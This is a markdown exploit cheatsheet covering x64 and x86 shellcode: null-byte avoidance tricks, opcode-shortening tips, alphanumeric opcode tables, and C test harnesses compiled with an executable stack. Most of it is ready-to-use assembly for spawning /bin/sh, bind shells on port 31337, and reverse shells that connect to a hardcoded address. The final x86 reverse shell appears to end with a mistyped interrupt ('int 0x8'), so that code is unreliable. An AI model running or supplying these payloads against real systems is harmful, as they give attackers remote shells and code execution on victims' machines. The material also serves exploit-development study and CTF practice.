# Exploit-Cheatsheet

## Shellcode

### `x64`

#### Common techniques

* prevent null byte
    * Use existing values from registers/stack
        * e.g. if initially `rdi` is already 0, `xor rdi, rdi` becomes redundant
    * `xor rax, rax`: zero out `rax`, no null byte opcode
    * `mov rax, 0x30` → `push 0x30; pop rax`
    * `push 0x697a0002` → `push word 0x697a; push word 0x2`
* shorter opcode:
    * `cdq` (1 byte): zero out `rdx` if `rax >= 0`
    * `imul esi` (2 bytes): zero out `rdx` if `rsi == 0`
    * `push 0x30; pop rax` (3 bytes) → `mov al, 0x30`
    * `add eax, 1` (3 bytes), `inc rax` (3 bytes) → `inc eax` (2 bytes), `add al, 1` (2 bytes)
    * `xchg` (2 bytes)
* Caveats
    * if `eax == 0x000000ff`, then after `add al, 1`, `eax == 0x00000000`
        * use `inc ax`, `inc eax`, `inc rax` instead if you want `eax == 0x00000100`
    * `mov [m64], imm64` is not possible
        * e.g., `mov [rax], 0x68732f2f6e69622f` is not possible
        * Change to `mov rbx, 0x68732f2f6e69622f; mov [rax], rbx`

#### Example

* `execve("/bin/sh", NULL, NULL)` (Null Free, 22 Bytes)

```
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```

* Bind shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; bind(s, [2, port, 0], 16)
xchg rax, rdi
mov al, 0x31
push rdx
push word 0x697a ; 31337
push word 0x2
push rsp
pop rsi
mov dl, 0x10
syscall

; listen(s, 0)
mov al, 0x32
xor esi, esi
syscall

; c = accept(s, 0, 0)
mov al, 0x2b
cdq
syscall

; dup2(c, {2,1,0});
xchg rax, rdi
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

* Reverse shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; connect(s, [2, port, ip], 16)
xchg rax, rdi
push 0x101017f ; ip
push word 0x697a ; port
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x2a
syscall

; dup2(s, {2,1,0});
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

### `x86`

* `execve("/bin/sh", NULL, NULL)`

```
xor eax, eax
xor ecx, ecx
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor al, 0xb
int 0x80
```

* Bind Shell

```
push 0x66
pop eax
push 0x1
pop ebx
xor esi, esi
push esi
push ebx
push 0x2
mov ecx, esp
int 0x80

pop edi
xchg edi, eax
xchg ebx, eax
mov al, 0x66
push esi
push 0x697a ; port 31337
push bx
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80

mov al, 0x66
mov bl, 0x4
push esi
push edi
mov ecx, esp
int 0x80
mov al, 0x66
inc ebx
push esi
push esi
push edi
mov ecx, esp
int 0x80

pop ecx
pop ecx
mov cl, 0x2
xchg ebx, eax
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
inc ecx
mov edx, ecx
int 0x80
```

* Reverse Shell

```
push 0x66
pop eax
cdq
xor ebx, ebx
inc ebx
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80

pop ecx
xchg eax, ebx
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0x66
push 0x101017f
push word 0x672b
push 0x2
mov ecx, esp
push 0x10
push ecx
push ebx
mov ecx, esp
int 0x80

mov al, 0xb
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
int 0x8
```

#### Shellcode Testing
* From string
Source (`sc.c`)
```c
int main() {
    char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* From file
```c
#include <stdio.h>
#include <stdlib.h>
#define SHELLCODE_LENGTH 4096
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
        exit(EXIT_FAILURE);
    }
    char shellcode[SHELLCODE_LENGTH]; // shellcode
    FILE *fp = fopen(argv[1], "rb");
    if (fp == NULL) {
        fprintf(stderr, "Cannot open file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, SHELLCODE_LENGTH, 1, fp);
    if (ferror(fp)) {
        fprintf(stderr, "Cannot read file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* Compile
```bash
gcc sc.c -z execstack -o sc
```

### Alphanumeric Shellcode

* `push`
    | Instruction | Opcode | Instruction | Opcode |
    | - | - | - | - |
    | `push rax` | `P` | `push rcx` | `Q` |
    | `push rdx` | `R` | `push rbx` | `S` |
    | `push rsp` | `T` | `push rbp` | `U` |
    | `push rsi` | `V` | `push rdi` | `W` |
    | `push r8` | `AP` | `push r9` | `AQ` |
    | `push r10` | `AR` | `push r11` | `AS` |
    | `push r12` | `AT` | `push r13` | `AU` |
    | `push r14` | `AV` | `push r15` | `AW` |
    | `push ax` | `fP` | `push cx` | `fQ` |
    | `push dx` | `fR` | `push bx` | `fS` |
    | `push sp` | `fT` | `push bp` | `fU` |
    | `push si` | `fV` | `push di` | `fW` |
    | `push r8w` | `fAP` | `push r9w` | `fAQ` |
    | `push r10w` | `fAR` | `push r11w` | `fAS` |
    | `push r12w` | `fAT` | `push r13w` | `fAU` |
    | `push r14w` | `fAV` | `push r15w` | `fAW` |
    | `push byte 0x30 ` | `j0` | `push word 0x3030` | `fh00` |
    | `push 0x30303030` | `h0000` |
* `pop`
    | Instruction | Opcode |
    | - | - |
    | `pop rax` | `X` |
    | `pop rcx` | `Y` |
    | `pop rdx` | `Z` |
    | `pop r8` | `AX` |
    | `pop r9` | `AY` |
    | `pop r10` | `AZ` |
    | `pop ax` | `fX` |
    | `pop cx` | `fY` |
    | `pop dx` | `fZ` |
    | `pop r8w` | `fAX` |
    | `pop r9w` | `fAY` |
    | `pop r10w` | `fAZ` |
* prefix
    | Prefix Description | Opcode | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `f` | 16-bit operand size | `push rax` → `push ax` | `P` → `fP` |
    | `g` | 64-bit register size override | `xor [rax], dh` → `xor [eax], dh` | `00` → `g00` |
* `xor`
    * Manipulate `rax`
        | Instruction | Opcode |
        | - | - |
        | `xor al, 0x30` | `40` |
        | `xor ax, 0x3030` | `f500` |
        | `xor eax, 0x30303030` | `50000` |
        | `xor rax, 0x30303030` | `H50000` |
    * `0x30` opcode
        | Instruction | Opcode |
        | - | - |
        | `xor [rax], dh` | `00` |
        | `xor [rax + rsi], dh` | `040` |
        | `xor [rcx + rax*2], dh` | `04A` |
        | `xor [rcx + 0x30], al` | `0A0` |
        | `xor [rax + rsi + 0x30], al` | `0D00` |
        | `xor [rcx + rax*2 + 0x30], al` | `0DA0` |
        | `xor [rip + 0x30303030], dh` | `050000` |
        | `xor [rsi + 0x30303030], dh` | `0450000` |
        | `xor [rax*2 + 0x30303030], dh` | `04E0000` |
        | `xor [0x30303030], dh` | `04e0000` |
